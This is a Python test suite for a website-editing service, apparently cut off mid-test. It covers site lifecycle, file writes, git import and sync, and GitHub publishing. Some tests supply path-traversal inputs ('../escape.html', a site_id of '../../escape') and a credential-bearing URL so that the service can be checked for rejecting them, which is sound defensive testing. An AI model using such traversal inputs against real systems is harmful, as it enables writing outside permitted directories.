"""Website Studio service tests."""

from __future__ import annotations

import base64
import json
import multiprocessing
import os
import shutil
from contextlib import closing
from io import BytesIO
from pathlib import Path
import sqlite3
import subprocess
import sys
import tempfile
import time
import unittest
from unittest.mock import patch
from zipfile import ZipFile

APP_ROOT = Path(__file__).resolve().parents[1]
MAVERICK_ROOT = next(parent for parent in APP_ROOT.parents if (parent / "core").is_dir())
sys.path.insert(0, str(APP_ROOT))
sys.path.insert(0, str(APP_ROOT / "backend"))

from backend.service import app_events_for_action, handle_action, resolve_secret_resource
from backend.store import _git_import_source_ref, _redact_secret_text, _replace_preview_media_urls_with_gateway, _site_mutation_lock, rebuild_index
from github_publish import _github_error_detail
from preview_runtime import (
    PhpPreviewServer,
    _bounded_log,
    _php_preview_server,
    _resolve_workspace_binary,
    _safe_env,
    _shutdown_php_preview_servers,
    build_plan_for_source,
    internal_routes_from_html,
    prepare_runtime_build,
    runtime_capability_status,
    runtime_process_policy,
)
from safety import MAX_SOURCE_TREE_FILES, validate_source_tree_for_phase1


class FakeGitHubTransport:
    def __init__(self) -> None:
        self.calls: list[tuple[str, str, dict[str, object]]] = []

    def __call__(self, method: str, url: str, request: dict[str, object]) -> tuple[int, object]:
        self.calls.append((method, url, request))
        if method == "GET" and "/git/ref/heads/main" in url:
            return 200, {"object": {"sha": "base-sha"}}
        if method == "GET" and "/git/commits/base-sha" in url:
            return 200, {"tree": {"sha": "base-tree-sha"}}
        if method == "POST" and url.endswith("/git/blobs"):
            return 201, {"sha": f"blob-{len([call for call in self.calls if call[1].endswith('/git/blobs')])}"}
        if method == "POST" and url.endswith("/git/trees"):
            return 201, {"sha": "tree-sha"}
        if method == "POST" and url.endswith("/git/commits"):
            return 201, {"sha": "commit-sha"}
        if method == "GET" and "/git/ref/heads/maverick%2F" in url:
            return 404, {}
        if method == "POST" and url.endswith("/git/refs"):
            return 201, {"ref": "refs/heads/maverick/site/test"}
        if method == "GET" and "/pulls?" in url:
            return 200, []
        if method == "POST" and url.endswith("/pulls"):
            return 201, {"number": 42, "html_url": "https://github.com/example-org/site-web/pull/42"}
        return 500, {"message": f"unexpected fake GitHub request {method} {url}"}


class ExistingBranchGitHubTransport(FakeGitHubTransport):
    def __call__(self, method: str, url: str, request: dict[str, object]) -> tuple[int, object]:
        self.calls.append((method, url, request))
        if method == "GET" and "/git/ref/heads/main" in url:
            return 200, {"object": {"sha": "base-sha"}}
        if method == "GET" and "/git/commits/base-sha" in url:
            return 200, {"tree": {"sha": "base-tree-sha"}}
        if method == "POST" and url.endswith("/git/blobs"):
            return 201, {"sha": f"blob-{len([call for call in self.calls if call[1].endswith('/git/blobs')])}"}
        if method == "POST" and url.endswith("/git/trees"):
            return 201, {"sha": "tree-sha"}
        if method == "POST" and url.endswith("/git/commits"):
            return 201, {"sha": "commit-sha"}
        if method == "GET" and "/git/ref/heads/maverick%2F" in url:
            return 200, {"object": {"sha": "previous-branch-sha"}}
        if method == "PATCH" and "/git/ref/heads/maverick%2F" in url:
            body = request.get("json") if isinstance(request.get("json"), dict) else {}
            if body.get("force") is not False:
                return 500, {"message": "branch update must not force push"}
            return 200, {"object": {"sha": body.get("sha")}}
        if method == "GET" and "/pulls?" in url:
            return 200, []
        if method == "POST" and url.endswith("/pulls"):
            return 201, {"number": 43, "html_url": "https://github.com/example-org/site-web/pull/43"}
        return 500, {"message": f"unexpected fake GitHub request {method} {url}"}


class ConflictingBranchGitHubTransport(ExistingBranchGitHubTransport):
    def __call__(self, method: str, url: str, request: dict[str, object]) -> tuple[int, object]:
        if method == "PATCH" and "/git/ref/heads/maverick%2F" in url:
            self.calls.append((method, url, request))
            body = request.get("json") if isinstance(request.get("json"), dict) else {}
            self.seen_patch_body = dict(body)
            return 422, {"message": "Update is not a fast-forward"}
        return super().__call__(method, url, request)


def _write_with_expected_hash_worker(data_root: str, site_id: str, expected_hash: str, queue) -> None:
    status, result = handle_action(
        Path(data_root),
        {
            "action": "write_file",
            "site_id": site_id,
            "path": "index.html",
            "content": "<title>Concurrent</title>",
            "expected_hash": expected_hash,
        },
    )
    queue.put((status, result.get("detail", "")))


def _edit_index(data_root: Path, site_id: str, marker: str = "Edited") -> None:
    status, read_payload = handle_action(data_root, {"action": "read_file", "site_id": site_id, "path": "index.html"})
    if status != 200:
        raise AssertionError(read_payload)
    status, write_payload = handle_action(
        data_root,
        {
            "action": "write_file",
            "site_id": site_id,
            "path": "index.html",
            "content": read_payload["file"]["content"].replace("</main>", f"<p>{marker}</p></main>", 1),
            "expected_hash": read_payload["file"]["hash"],
        },
    )
    if status != 200:
        raise AssertionError(write_payload)


def _approval_actor(user_id: str = "user:owner", workspace_role: str = "owner") -> dict[str, object]:
    return {
        "user_id": user_id,
        "workspace_role": workspace_role,
        "platform_role": "",
        "effective_mode": "sandbox",
    }


class WebsiteStudioEntrypointTest(unittest.TestCase):
    def tearDown(self) -> None:
        _shutdown_php_preview_servers()

    def test_manifest_clarifies_phase3_hosting_boundary(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            status, manifest = handle_action(Path(tmp), {"action": "manifest"})

            self.assertEqual(status, 200)
            self.assertEqual(manifest["phase"], "phase_3")
            self.assertEqual(manifest["phase_status"], "phase_3_app_orchestration_ready_platform_hosting_missing")
            self.assertEqual(manifest["platform_hosting_status"], "pending_generic_surface")
            self.assertIn("phase_3a_runtime_preview", manifest["implemented_phases"])
            self.assertEqual(manifest["phase_3a_runtime_status"], "ready")
            self.assertEqual(manifest["maintenance_policy"]["keep_builds"], 10)
            self.assertTrue(manifest["maintenance_policy"]["dry_run_first"])
            self.assertIn("deployment artifacts", manifest["maintenance_policy"]["protected_records"])
            self.assertEqual(manifest["runtime_process_policy"], runtime_process_policy())
            self.assertTrue(manifest["runtime_process_policy"]["process_group_cleanup"])
            self.assertIn("NPM_CONFIG_IGNORE_SCRIPTS", manifest["runtime_process_policy"]["safe_environment"])
            self.assertFalse(manifest["runtime_process_policy"]["isolated_environment"]["inherits_operator_home"])
            self.assertGreaterEqual(manifest["runtime_process_policy"]["resource_limits"]["build_command"]["memory_bytes"], 1024 * 1024 * 1024)
            self.assertGreaterEqual(manifest["runtime_process_policy"]["resource_limits"]["build_command"]["processes"], 512)
            self.assertEqual(manifest["acceptance_verification"]["status"], "implemented_with_guarded_platform_gaps")
            self.assertFalse(manifest["acceptance_verification"]["runtime_security_boundary"]["production_sandbox"])
            self.assertIn("os_level_sandboxing", manifest["acceptance_verification"]["runtime_security_boundary"]["platform_gaps"])

    def test_site_edit_diff_and_publish_block(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]

            status, map_payload = handle_action(data_root, {"action": "sitemap", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual(map_payload["items"][0]["route"], "/")

            status, read_payload = handle_action(data_root, {"action": "read_file", "site_id": site_id, "path": "index.html"})
            self.assertEqual(status, 200)
            original_hash = read_payload["file"]["hash"]

            status, write_payload = handle_action(
                data_root,
                {
                    "action": "write_file",
                    "site_id": site_id,
                    "path": "index.html",
                    "content": read_payload["file"]["content"].replace("Acme", "Acme Studio", 1),
                    "expected_hash": original_hash,
                },
            )
            self.assertEqual(status, 200)
            self.assertIn("changeset", write_payload)

            status, stale = handle_action(
                data_root,
                {
                    "action": "write_file",
                    "site_id": site_id,
                    "path": "index.html",
                    "content": "stale",
                    "expected_hash": original_hash,
                },
            )
            self.assertEqual(status, 400)
            self.assertIn("stale write", stale["detail"])

            status, diff = handle_action(data_root, {"action": "diff", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual(diff["files"][0]["path"], "index.html")

            status, blocked = handle_action(data_root, {"action": "publish", "site_id": site_id})
            self.assertEqual(status, 403)
            self.assertTrue(blocked["blocked"])

    def test_site_create_rejects_future_source_providers_until_implemented(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            status, result = handle_action(
                Path(tmp),
                {"action": "site_create", "display_name": "CMS Later", "source_provider": "cms"},
            )

            self.assertEqual(status, 400)
            self.assertIn("CMS and commerce providers are later phases", result["detail"])

    def test_secret_selector_requests_github_token_for_prepared_import(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, prepared = handle_action(
                data_root,
                {
                    "action": "git_connection_prepare",
                    "display_name": "Private Site",
                    "repository_url": "https://github.com/example-org/private-site",
                    "base_branch": "main",
                },
            )
            self.assertEqual(status, 201)
            site_id = prepared["site"]["id"]

            result = resolve_secret_resource(
                data_root,
                {
                    "action": "import_git",
                    "site_id": site_id,
                    "repository_url": "https://github.com/example-org/private-site.git",
                    "_app_secret_selector": {"logical_names": ["github-token"]},
                },
            )

            self.assertTrue(result["requires_secrets"])
            self.assertEqual(result["provider"], "github")
            self.assertEqual(result["connection_id"], prepared["connection"]["id"])

            public_result = resolve_secret_resource(
                data_root,
                {
                    "action": "import_git",
                    "repository_url": "https://github.com/example-org/public-site.git",
                    "_app_secret_selector": {"logical_names": ["github-token"]},
                },
            )
            self.assertFalse(public_result["requires_secrets"])

    def test_secret_selector_requests_github_token_for_git_publish(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, prepared = handle_action(
                data_root,
                {
                    "action": "git_connection_prepare",
                    "display_name": "Private Site",
                    "repository_url": "https://github.com/example-org/private-site",
                    "base_branch": "main",
                },
            )
            self.assertEqual(status, 201)

            result = resolve_secret_resource(
                data_root,
                {
                    "action": "publish",
                    "site_id": prepared["site"]["id"],
                    "_app_secret_selector": {"logical_names": ["github-token"]},
                },
            )

            self.assertTrue(result["requires_secrets"])
            self.assertEqual(result["provider"], "github")
            self.assertEqual(result["connection_id"], prepared["connection"]["id"])

    def test_site_lifecycle_archive_restore_rename_and_duplicate(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]

            status, renamed = handle_action(
                data_root,
                {"action": "site_rename", "site_id": site_id, "display_name": "Acme Studio", "slug": "acme"},
            )
            self.assertEqual(status, 200)
            self.assertEqual(renamed["site"]["display_name"], "Acme Studio")
            self.assertEqual(renamed["site"]["slug"], "acme")

            status, archived = handle_action(data_root, {"action": "site_archive", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual(archived["site"]["status"], "archived")
            self.assertTrue(archived["site"]["archived_at"])

            status, restored = handle_action(data_root, {"action": "site_restore", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual(restored["site"]["status"], "draft")
            self.assertIsNone(restored["site"]["archived_at"])

            status, duplicated = handle_action(
                data_root,
                {"action": "site_duplicate", "site_id": site_id, "display_name": "Acme Clone", "slug": "acme"},
            )
            self.assertEqual(status, 201)
            self.assertNotEqual(duplicated["site"]["id"], site_id)
            self.assertEqual(duplicated["site"]["slug"], "acme-2")
            self.assertTrue((data_root / "sites" / duplicated["site"]["id"] / "source" / "index.html").exists())

    def test_rebuild_index_allows_route_to_change_from_sitemap_to_static(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Routes"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            source_root = data_root / "sites" / site_id / "source"
            (source_root / "sitemap.xml").write_text(
                '<urlset><url><loc>https://example.com/about</loc></url></urlset>',
                encoding="utf-8",
            )

            rebuild_index(data_root, site_id)
            status, sitemap_payload = handle_action(data_root, {"action": "sitemap", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertIn("/about", {route["route"] for route in sitemap_payload["routes"]})

            (source_root / "about.html").write_text("<html><title>About</title></html>", encoding="utf-8")
            rebuild_index(data_root, site_id)
            status, status_payload = handle_action(data_root, {"action": "site_status", "site_id": site_id})

            self.assertEqual(status, 200)
            self.assertGreaterEqual(status_payload["route_count"], 1)

    def test_active_site_selection_persists_for_context_and_listing(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, first = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            status, second = handle_action(data_root, {"action": "site_create", "display_name": "Beta"})
            self.assertEqual(status, 201)

            status, selected = handle_action(data_root, {"action": "site_set_active", "site_id": first["site"]["id"]})
            self.assertEqual(status, 200)
            self.assertEqual(selected["state"]["active_site_id"], first["site"]["id"])
            self.assertTrue(selected["site"]["is_active"])

            status, listed = handle_action(data_root, {"action": "sites_list"})
            self.assertEqual(status, 200)
            active = [item["id"] for item in listed["items"] if item["is_active"]]
            self.assertEqual(active, [first["site"]["id"]])

            status, context = handle_action(data_root, {"action": "active_context"})
            self.assertEqual(status, 200)
            self.assertEqual(context["site_id"], first["site"]["id"])

            status, archived = handle_action(data_root, {"action": "site_archive", "site_id": first["site"]["id"]})
            self.assertEqual(status, 200)
            self.assertEqual(archived["site"]["status"], "archived")
            status, blocked = handle_action(data_root, {"action": "site_set_active", "site_id": first["site"]["id"]})
            self.assertEqual(status, 400)
            self.assertIn("archived sites", blocked["detail"])

            status, context = handle_action(data_root, {"action": "active_context"})
            self.assertEqual(status, 200)
            self.assertEqual(context["site_id"], second["site"]["id"])

    def test_active_context_ignores_archived_sites_when_state_is_stale(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Archived"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]

            status, archived = handle_action(data_root, {"action": "site_archive", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual(archived["site"]["status"], "archived")
            (data_root / "view_state.json").write_text(
                json.dumps({"schema_version": "1", "active_site_id": site_id, "view_filter": {"mode": "search"}}),
                encoding="utf-8",
            )

            status, listed = handle_action(data_root, {"action": "sites_list"})
            self.assertEqual(status, 200)
            self.assertFalse(listed["items"][0]["is_active"])

            status, context = handle_action(data_root, {"action": "active_context"})
            self.assertEqual(status, 200)
            self.assertEqual(context["active_view"], "empty")
            self.assertIsNone(context["site_id"])

            status, explicit_context = handle_action(data_root, {"action": "page_context", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual(explicit_context["active_view"], "empty")

    def test_zip_import_rejects_path_traversal(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("../escape.html", "<html></html>")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, result = handle_action(
                Path(tmp),
                {"action": "import_zip", "display_name": "Unsafe", "archive_base64": encoded},
            )
            self.assertEqual(status, 400)
            self.assertIn("unsafe path", result["detail"].lower())

    def test_zip_import_rejects_invalid_archive(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            encoded = base64.b64encode(b"not a zip").decode("ascii")

            status, result = handle_action(
                Path(tmp),
                {"action": "import_zip", "display_name": "Invalid", "archive_base64": encoded},
            )

            self.assertEqual(status, 400)
            self.assertIn("valid zip", result["detail"].lower())

    def test_zip_import_rejects_executable_and_sensitive_files(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("index.html", "<title>Site</title>")
                zip_file.writestr(".env", "SECRET=value")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, result = handle_action(
                Path(tmp),
                {"action": "import_zip", "display_name": "Unsafe", "archive_base64": encoded},
            )

            self.assertEqual(status, 400)
            self.assertIn("sensitive file", result["detail"])

    def test_git_import_indexes_site(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            repo_root = data_root / "fixtures" / "repo"
            repo_root.mkdir(parents=True)
            (repo_root / "index.html").write_text("<title>Git Site</title><main>Imported</main>", encoding="utf-8")
            (repo_root / "package.json").write_text('{"scripts":{"build":"vite build"}}', encoding="utf-8")
            (repo_root / "vite.config.ts").write_text("export default {}\n", encoding="utf-8")
            (repo_root / "package-lock.json").write_text("{}", encoding="utf-8")
            subprocess.run(["git", "init"], cwd=repo_root, check=True, capture_output=True, text=True)
            subprocess.run(["git", "config", "user.email", "agent@example.com"], cwd=repo_root, check=True)
            subprocess.run(["git", "config", "user.name", "Agent"], cwd=repo_root, check=True)
            subprocess.run(["git", "add", "."], cwd=repo_root, check=True)
            subprocess.run(["git", "commit", "-m", "initial"], cwd=repo_root, check=True, capture_output=True, text=True)

            status, result = handle_action(
                data_root,
                {"action": "import_git", "repository_url": str(repo_root), "display_name": "Git Site"},
            )

            self.assertEqual(status, 201)
            self.assertEqual(result["site"]["source_provider"], "git")
            self.assertEqual(result["import"]["source_shape"], "full_source")
            self.assertEqual(result["import"]["source_profile"]["framework"], "vite")
            self.assertEqual(result["import"]["source_profile"]["package_manager"], "npm")
            self.assertIn("revision", result)

            status, map_payload = handle_action(data_root, {"action": "sitemap", "site_id": result["site"]["id"]})
            self.assertEqual(status, 200)
            self.assertEqual(map_payload["items"][0]["route"], "/")

    def test_git_sync_updates_clean_working_copy_and_records_sync_run(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            repo_root = data_root / "fixtures" / "repo"
            repo_root.mkdir(parents=True)
            (repo_root / "index.html").write_text("<title>Git Site</title><main>Initial</main>", encoding="utf-8")
            subprocess.run(["git", "init"], cwd=repo_root, check=True, capture_output=True, text=True)
            subprocess.run(["git", "config", "user.email", "agent@example.com"], cwd=repo_root, check=True)
            subprocess.run(["git", "config", "user.name", "Agent"], cwd=repo_root, check=True)
            subprocess.run(["git", "add", "."], cwd=repo_root, check=True)
            subprocess.run(["git", "commit", "-m", "initial"], cwd=repo_root, check=True, capture_output=True, text=True)
            status, imported = handle_action(data_root, {"action": "import_git", "repository_url": str(repo_root), "display_name": "Git Site"})
            self.assertEqual(status, 201)
            site_id = imported["site"]["id"]

            (repo_root / "index.html").write_text("<title>Git Site</title><main>Remote update</main>", encoding="utf-8")
            (repo_root / "about.html").write_text("<title>About</title>", encoding="utf-8")
            subprocess.run(["git", "add", "."], cwd=repo_root, check=True)
            subprocess.run(["git", "commit", "-m", "remote update"], cwd=repo_root, check=True, capture_output=True, text=True)

            status, synced = handle_action(data_root, {"action": "sync_source", "site_id": site_id})

            self.assertEqual(status, 200)
            self.assertFalse(synced["blocked"])
            self.assertEqual(synced["sync_run"]["status"], "synced")
            self.assertEqual(synced["revision"]["source"], "git_sync")
            status, read_payload = handle_action(data_root, {"action": "read_file", "site_id": site_id, "path": "index.html"})
            self.assertEqual(status, 200)
            self.assertIn("Remote update", read_payload["file"]["content"])
            status, map_payload = handle_action(data_root, {"action": "sitemap", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertIn("/about", {item["route"] for item in map_payload["items"]})
            status, changes = handle_action(data_root, {"action": "list_changes", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual(changes["sync_runs"][0]["id"], synced["sync_run"]["id"])

    def test_git_sync_blocks_when_local_working_changes_exist(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            repo_root = data_root / "fixtures" / "repo"
            repo_root.mkdir(parents=True)
            (repo_root / "index.html").write_text("<title>Git Site</title><main>Initial</main>", encoding="utf-8")
            subprocess.run(["git", "init"], cwd=repo_root, check=True, capture_output=True, text=True)
            subprocess.run(["git", "config", "user.email", "agent@example.com"], cwd=repo_root, check=True)
            subprocess.run(["git", "config", "user.name", "Agent"], cwd=repo_root, check=True)
            subprocess.run(["git", "add", "."], cwd=repo_root, check=True)
            subprocess.run(["git", "commit", "-m", "initial"], cwd=repo_root, check=True, capture_output=True, text=True)
            status, imported = handle_action(data_root, {"action": "import_git", "repository_url": str(repo_root), "display_name": "Git Site"})
            self.assertEqual(status, 201)
            site_id = imported["site"]["id"]
            _edit_index(data_root, site_id, marker="Local change")

            (repo_root / "index.html").write_text("<title>Git Site</title><main>Remote update</main>", encoding="utf-8")
            subprocess.run(["git", "add", "."], cwd=repo_root, check=True)
            subprocess.run(["git", "commit", "-m", "remote update"], cwd=repo_root, check=True, capture_output=True, text=True)

            status, blocked = handle_action(data_root, {"action": "sync_source", "site_id": site_id})

            self.assertEqual(status, 409)
            self.assertTrue(blocked["blocked"])
            self.assertEqual(blocked["sync_run"]["status"], "blocked_local_changes")
            self.assertEqual(blocked["conflicts"][0]["path"], "index.html")
            status, read_payload = handle_action(data_root, {"action": "read_file", "site_id": site_id, "path": "index.html"})
            self.assertEqual(status, 200)
            self.assertIn("Local change", read_payload["file"]["content"])

    def test_git_import_rejects_inline_credentials(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            status, result = handle_action(
                Path(tmp),
                {"action": "import_git", "repository_url": "https://user:secret@example.com/repo.git"},
            )

            self.assertEqual(status, 400)
            self.assertIn("inline credentials", result["detail"])

    def test_git_import_rejects_non_github_remote_sources(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            status, result = handle_action(
                Path(tmp),
                {"action": "import_git", "repository_url": "ssh://example.com/company/site.git"},
            )

            self.assertEqual(status, 400)
            self.assertIn("GitHub HTTPS", result["detail"])

    def test_git_connection_prepare_records_repo_and_vault_requirements(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, prepared = handle_action(
                data_root,
                {
                    "action": "git_connection_prepare",
                    "repository_url": "example-org/site-web",
                    "base_branch": "main",
                    "auth_mode": "fine_grained_token",
                },
            )

            self.assertEqual(status, 201)
            self.assertEqual(prepared["connection"]["owner"], "example-org")
            self.assertEqual(prepared["connection"]["repo"], "site-web")
            self.assertEqual(prepared["connection"]["repository_url"], "https://github.com/example-org/site-web.git")
            self.assertEqual(prepared["connection"]["status"], "pending_vault_grant")
            self.assertEqual(prepared["connection"]["secret_logical_name"], "github-token")
            self.assertTrue(prepared["connection"]["secret_configured"])
            self.assertEqual(prepared["vault_requirements"]["required_secrets"], ["github-token"])
            self.assertNotIn("private_key", json.dumps(prepared).lower())
            self.assertTrue(prepared["site"]["is_active"])

            status, listed = handle_action(data_root, {"action": "git_connections_list", "site_id": prepared["site"]["id"]})
            self.assertEqual(status, 200)
            self.assertEqual(listed["items"][0]["id"], prepared["connection"]["id"])

    def test_git_import_source_ref_preserves_prepared_github_connection(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, prepared = handle_action(data_root, {"action": "git_connection_prepare", "repository_url": "example-org/site-web", "base_branch": "main"})
            self.assertEqual(status, 201)

            source_ref = _git_import_source_ref(data_root, prepared["site"], "https://github.com/example-org/site-web.git", "maverick-work")

            self.assertEqual(source_ref["provider"], "github")
            self.assertEqual(source_ref["connection_id"], prepared["connection"]["id"])
            self.assertEqual(source_ref["base_branch"], "maverick-work")
            self.assertEqual(source_ref["owner"], "example-org")
            self.assertEqual(source_ref["repo"], "site-web")

    def test_git_connection_prepare_defaults_to_fine_grained_token_reference(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            status, prepared = handle_action(
                Path(tmp),
                {
                    "action": "git_connection_prepare",
                    "repository_url": "https://github.com/example-org/site-web.git",
                },
            )

            self.assertEqual(status, 201)
            self.assertEqual(prepared["connection"]["secret_logical_name"], "github-token")
            self.assertEqual(prepared["vault_requirements"]["required_secrets"], ["github-token"])

    def test_git_connection_prepare_rejects_raw_or_invalid_secret_shape(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            for payload, expected in (
                ({"repository_url": "https://user:secret@github.com/example-org/site-web.git"}, "inline credentials"),
                ({"repository_url": "example-org/site-web", "auth_mode": "unsupported"}, "auth_mode"),
                ({"repository_url": "example-org/site-web", "auth_mode": "github_app"}, "auth_mode"),
                ({"repository_url": "example-org/site-web", "secret_logical_name": "not-declared"}, "secret_logical_name"),
            ):
                status, result = handle_action(Path(tmp), {"action": "git_connection_prepare", **payload})
                self.assertEqual(status, 400)
                self.assertIn(expected, result["detail"])

    def test_git_import_normalizes_executable_script_mode_without_running_source(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            repo_root = data_root / "fixtures" / "executable-repo"
            repo_root.mkdir(parents=True)
            (repo_root / "index.html").write_text("<title>Safe</title>", encoding="utf-8")
            runner = repo_root / "scripts" / "start_local.sh"
            runner.parent.mkdir()
            runner.write_text("#!/usr/bin/env bash\n", encoding="utf-8")
            runner.chmod(0o755)
            subprocess.run(["git", "init"], cwd=repo_root, check=True, capture_output=True, text=True)
            subprocess.run(["git", "config", "user.email", "agent@example.com"], cwd=repo_root, check=True)
            subprocess.run(["git", "config", "user.name", "Agent"], cwd=repo_root, check=True)
            subprocess.run(["git", "add", "."], cwd=repo_root, check=True)
            subprocess.run(["git", "commit", "-m", "executable"], cwd=repo_root, check=True, capture_output=True, text=True)

            status, result = handle_action(
                data_root,
                {"action": "import_git", "repository_url": str(repo_root), "display_name": "Executable Site"},
            )

            self.assertEqual(status, 201)
            imported_script = data_root / "sites" / result["site"]["id"] / "source" / "scripts" / "start_local.sh"
            self.assertTrue(imported_script.exists())
            self.assertFalse(imported_script.stat().st_mode & 0o111)

    def test_write_rejects_site_id_escape_before_writing(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp) / "data"
            outside = Path(tmp) / "escape" / "source" / "pwn.txt"

            status, result = handle_action(
                data_root,
                {"action": "write_file", "site_id": "../../escape", "path": "pwn.txt", "content": "outside write"},
            )

            self.assertEqual(status, 400)
            self.assertIn("not found", result["detail"])
            self.assertFalse(outside.exists())

    def test_write_and_patch_require_expected_hash(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]

            status, result = handle_action(
                data_root,
                {"action": "write_file", "site_id": site_id, "path": "index.html", "content": "overwrite"},
            )
            self.assertEqual(status, 400)
            self.assertIn("expected_hash is required", result["detail"])

            status, result = handle_action(
                data_root,
                {
                    "action": "apply_patch",
                    "site_id": site_id,
                    "path": "index.html",
                    "old_text": "Acme",
                    "new_text": "Acme Studio",
                },
            )
            self.assertEqual(status, 400)
            self.assertIn("expected_hash is required", result["detail"])

            status, created_file = handle_action(
                data_root,
                {
                    "action": "write_file",
                    "site_id": site_id,
                    "path": "new-page.html",
                    "content": "<title>New</title>",
                    "expected_hash": "new",
                },
            )
            self.assertEqual(status, 200)
            self.assertEqual(created_file["file"]["path"], "new-page.html")

    def test_concurrent_write_checks_hash_after_site_lock(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            status, read_payload = handle_action(data_root, {"action": "read_file", "site_id": site_id, "path": "index.html"})
            self.assertEqual(status, 200)

            ctx = multiprocessing.get_context("fork")
            queue = ctx.Queue()
            process = ctx.Process(target=_write_with_expected_hash_worker, args=(str(data_root), site_id, read_payload["file"]["hash"], queue))
            source_file = data_root / "sites" / site_id / "source" / "index.html"
            with _site_mutation_lock(data_root, site_id):
                process.start()
                time.sleep(0.2)
                source_file.write_text("<title>Parent change</title>", encoding="utf-8")
            process.join(5)

            self.assertFalse(process.is_alive())
            worker_status, worker_detail = queue.get_nowait()
            self.assertEqual(worker_status, 400)
            self.assertIn("stale write", worker_detail)
            self.assertEqual(source_file.read_text(encoding="utf-8"), "<title>Parent change</title>")

    def test_write_rejects_sensitive_executable_and_unsupported_files(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]

            for rel_path, expected_detail in (
                (".env", "sensitive file"),
                ("README", "not a supported Website Studio text file"),
            ):
                status, result = handle_action(
                    data_root,
                    {
                        "action": "write_file",
                        "site_id": site_id,
                        "path": rel_path,
                        "content": "blocked",
                        "expected_hash": "new",
                    },
                )
                self.assertEqual(status, 400)
                self.assertIn(expected_detail, result["detail"])
            status, script = handle_action(
                data_root,
                {
                    "action": "write_file",
                    "site_id": site_id,
                    "path": "scripts/deploy.sh",
                    "content": "#!/usr/bin/env bash\n",
                    "expected_hash": "new",
                },
            )
            self.assertEqual(status, 200)
            script_path = data_root / "sites" / site_id / "source" / "scripts" / "deploy.sh"
            self.assertFalse(script_path.stat().st_mode & 0o111)

    def test_zip_reimport_failure_keeps_existing_source(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            starter = data_root / "sites" / site_id / "source" / "index.html"
            self.assertTrue(starter.exists())

            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("../escape.html", "<html></html>")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, result = handle_action(data_root, {"action": "import_zip", "site_id": site_id, "archive_base64": encoded})

            self.assertEqual(status, 400)
            self.assertIn("unsafe path", result["detail"].lower())
            self.assertTrue(starter.exists())

    def test_git_reimport_failure_keeps_existing_source(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            starter = data_root / "sites" / site_id / "source" / "index.html"
            original = starter.read_text(encoding="utf-8")

            repo_root = data_root / "fixtures" / "unsafe-repo"
            repo_root.mkdir(parents=True)
